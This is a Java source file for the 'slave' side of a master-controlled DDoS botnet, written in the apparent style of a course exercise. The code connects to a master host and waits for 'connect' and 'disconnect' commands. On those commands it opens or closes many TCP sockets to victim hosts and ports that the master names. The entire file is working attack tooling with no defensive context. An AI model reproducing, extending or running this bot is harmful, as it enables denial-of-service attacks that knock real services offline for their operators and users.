/* Slave for ddos.
 *
 * Aruthor : Sitao Mei
 *
 * The ddos topolog was as below:
 * Master -   Slave  -  Target
 *          \        \   ...
 *           \        \ Traget
 *            \ Slave - -
 *  Desc :
 *  This is slave ,receive user commands from master to connect or dis-connect to Targets (victims) via commands.
 */

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.*;
import java.net.*;
import java.text.*;

public class SlaveBot {

    BufferedReader reader;
    /* master attributes
     * belonging master's hostname and port.
     */
    static String host_m ="MasterBot" ;
    static int srcPort_m = 0;

    //Hashset to store all targets objects.
    HashSet <Tgt>  tgtSet = new HashSet <Tgt> () ;
    /* main
     *Input  : user cmd from master
     *         1) connect ;
     *         2) disconnect;
     */
    public static void main(String[] args){

        if ( args.length != 4 ) {
            System.out.println("Ilegal Parameter set; You should input format: SlaveBot -h <ip|hostname> -p <srcPort>");
            System.exit(1);
        }
        //Receive "-p" option for master port.
        String iparam_0 = args[0] ;
        String iparam_1 = args[2] ;
        if ( !iparam_0.equalsIgnoreCase("-h") ){
            System.out.println("Invalid Parameter : " + iparam_0 + " ; You should input format: SlaveBot -h <ip|hostname> -p <srcPort>");
            System.exit(1);
        }
        if ( !iparam_1.equalsIgnoreCase("-p") ){
            System.out.println("Invalid Parameter : " + iparam_1 + " ; You should input format: SlaveBot -h <ip|hostname> -p <srcPort>");
            System.exit(1);
        }

        //Retrieve parameters from command's parameters
        try {
            host_m = args[1];
            srcPort_m = Integer.parseInt(args[3]);
            System.out.println("Slave to master : "+ host_m + ", " +srcPort_m);
        }
        catch (NumberFormatException Nfe){
            System.out.println("Invalid parameter srcPort, You should input format: SlaveBot -h <ip|hostname> -p/P <srcPort>");
            System.exit(1);
        }
        //Call method go.
        SlaveBot slave = new SlaveBot();
        slave.go();
    } // close main

    /* method : go
     * Parse incoming commands and call corresponding methods.
     * Scanner : to read in cmd line from console.
     */
    public void go() {
        //Display ">" in terminal and create server socket.
        try {
            InetAddress addr_m = InetAddress.getByName(host_m);
            Socket sock = new Socket(addr_m,srcPort_m);
            System.out.println("Slave: connect to "+addr_m+","+srcPort_m);

            InputStreamReader instreamreader = new InputStreamReader(sock.getInputStream());
            reader = new BufferedReader(instreamreader);

            //While loop waiting for commands.
            String message=null;

            String [] splitcmd = null;
            String cmd = null;
            String tgtName = null ;
            int tgtPort =0  ;
            int numConn =1  ;
            InetAddress ipAddr ;

            while (true){
                try {
                    if ((message = reader.readLine()) != null) {
                        System.out.println("Slave received host command : " + message);
                        //connect command from master
                        splitcmd = message.split(" ");
                        cmd = splitcmd[0];
                        tgtName = splitcmd[2];
                        ipAddr = InetAddress.getByName(tgtName);
                        tgtPort = Integer.parseInt(splitcmd[3]);
                        if (splitcmd.length == 5)
                            numConn = Integer.parseInt(splitcmd[4]);

                        if (cmd.equalsIgnoreCase("connect")) {
                            addConns(tgtName, ipAddr, tgtPort, numConn);
                        }
                        //dis-connect command from master
                        else if (cmd.equalsIgnoreCase("disconnect")) {
                            delConns(ipAddr, tgtPort, numConn);
                        }
                        //others
                        else {
                            System.out.println("Fail: Invalid commands received from master!");
                        }

                        System.out.println("---------------" + cmd + "--------------------------");
                        printTgtConns();
                    }
                } catch (Exception ex) {
                    ex.printStackTrace();
                    break;
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            //System.exit(1);
        }
    } // close method go

    /* methode : add target connections per master's "connect" commands.
     *
     */
    public void addConns (String tgtName,InetAddress tgtAddr,int tgtPort,int numConns){

        // Creat requierd number of new connections to target
        ArrayList <Socket>  newSockSet = new ArrayList <Socket> () ;
        try {
            for (int idx = 0; idx < numConns; idx++) {
                System.out.println("new socket:"+tgtAddr+" "+tgtPort);
                Socket sock = new Socket(tgtAddr, tgtPort);
                newSockSet.add(sock);
            }
            //Traverse tagets set to check whehther already exised.
            int found = 0;
            for (Tgt tgt: tgtSet) {
                if ( (tgt.getAddr()==tgtAddr) && (tgt.getPort()==tgtPort)) {
                    tgt.sockSet.addAll(newSockSet);
                    found=1;
                    break;
                }
            }
            //New target : add new object into set.
            if (found==0) {
                Tgt newTgt = new Tgt (tgtName,tgtAddr,tgtPort) ;
                newTgt.sockSet.addAll(newSockSet);
                tgtSet.add(newTgt);
            }

        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    /* methode : del target connections per master's "disconnect" commands.
     *
     */
    public void delConns (InetAddress tgtAddr,int tgtPort,int numConns){

        if (tgtSet==null) {
            System.out.println ("Fail,Non-existed targt.");
            return ;
        }
        //Traverse tagets set to check whehther already exised.
        Tgt selTgt = null ;
        ArrayList <Socket> tgtConnSet = new ArrayList <Socket> () ;
        try {
            for (Tgt tgt : tgtSet) {
                if ((tgt.getAddr() == tgtAddr) && (tgt.getPort() == tgtPort)) {
                    tgtConnSet.addAll(tgt.sockSet);
                    selTgt=tgt;
                    break;
                }
            }

            if (tgtConnSet == null) {
                System.out.println("Fail, No existed target be found!");
                return;
            } else {
                //for (Socket sock : tgtConnSet) {
                int curTgtConnSize=tgtConnSet.size();
                for (int cnt=0;cnt< curTgtConnSize;cnt++) {
                    Socket sock = tgtConnSet.get(0) ;
                    sock.close();

                    System.out.println("Closing Socket cnt:"+cnt+" "+sock.getInetAddress()+" "+sock.getPort());
                    tgtConnSet.remove(sock);
                    if ( (cnt+1) == numConns) break;
                }
                if (tgtConnSet.isEmpty()) {
                    System.out.println("Removing Target Socket:"+selTgt.getAddr()+" "+selTgt.getPort());
                    tgtSet.remove(selTgt) ;
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public void printTgtConns () {
        for (Tgt tgt: tgtSet) {
            tgt.printTgtStauts();
        }
    }
    /* Sub-class :  Tgt
     * @tgtName : target name
     * @tgtPort : target port
     * @socketSet for connections with targets.
     *
     * This sub class is for registered class.
     */
    class Tgt implements Comparable<Tgt>{
        String tgtName ;
        InetAddress tgtAddr ;
        int tgtPort;
        ArrayList <Socket>  sockSet ;

        Tgt (String  name,InetAddress addr,int port ){
            tgtName = name ;
            tgtAddr = addr ;
            tgtPort = port ;
            if (sockSet==null)
                sockSet = new ArrayList <Socket> ();
        }

        public int compareTo (Tgt s){
            return tgtName.compareTo(s.tgtName);
        }

        public String getTgtName(){
            return tgtName ;
        }
        public InetAddress getAddr () {
            return tgtAddr ;
        }
        public int getPort () {
            return tgtPort;
        }

        public void printTgtStauts() {
           System.out.println("Target : "+tgtName+" "+ tgtAddr + " " + tgtPort) ;

           if ( sockSet.size()==0) {
               System.out.println("         Empty");
           }else {
               for (Socket sock : sockSet) {
                   System.out.println("      from port :" + sock.getPort());
               }
           }
           System.out.println("");
        }
    }

} //close class MaterBot
